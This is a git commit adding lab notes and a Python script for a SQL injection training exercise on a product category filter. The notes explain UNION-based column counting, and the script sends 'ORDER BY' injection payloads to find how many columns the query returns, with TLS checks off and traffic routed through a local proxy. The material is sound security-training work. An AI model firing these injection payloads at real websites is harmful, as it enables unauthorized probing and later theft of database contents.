304a5ee7a5aa0afe424946c2211e1463d3e42df4
Rana Khalil <ranakhalil101@gmail.com>
2021-03-17 19:33:06 -0400

    Add files via upload

---
+++ sql-injection/lab-03/notes.txt
@@ -0,0 +1,42 @@
+SQLi - Product category filter
+
+End Goal: determine the number of columns returned by the query. 
+
+Background (Union):
+
+table1      table2
+a | b       c | d 
+-----       -----
+1 , 2       2 , 3
+3 , 4       4 , 5
+
+Query #1: select a, b from table1
+1,2
+3,4
+
+Query #2: select a, b from table1 UNION select c,d from table2
+1,2
+3,4
+2,3
+4,5
+
+Rule: 
+- The number and the order of the columns must be the same in all queries
+- The data types must be compatible
+
+SQLi attack (way #1):
+
+select ? from table1 UNION select NULL
+-error -> incorrect number of columns
+
+select ? from table1 UNION select NULL, NULL, NULL
+-200 response code -> correct number of columns
+
+SQLi attack (way #2):
+
+select a, b from table1 order by 3
+
+
+script.py <url> 
+
+
---
+++ sql-injection/lab-03/sqli-lab-03.py
@@ -0,0 +1,34 @@
+import requests
+import sys
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
+
+def exploit_sqli_column_number(url):
+    path = "filter?category=Gifts"
+    for i in range(1,50):
+        sql_payload = "'+order+by+%s--" %i
+        r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
+        res = r.text
+        if "Internal Server Error" in res:
+            return i - 1
+        i = i + 1
+    return False
+
+if __name__ == "__main__":
+    try:
+        url = sys.argv[1].strip()
+    except IndexError:
+        print("[-] Usage: %s <url>" % sys.argv[0])
+        print("[-] Example: %s www.example.com" % sys.argv[0])
+        sys.exit(-1)
+
+    print("[+] Figuring out number of columns...")
+    num_col = exploit_sqli_column_number(url)
+    if num_col:
+        print("[+] The number of columns is " + str(num_col) + "." )
+    else:
+        print("[-] The SQLi attack was not successful.")
+
+
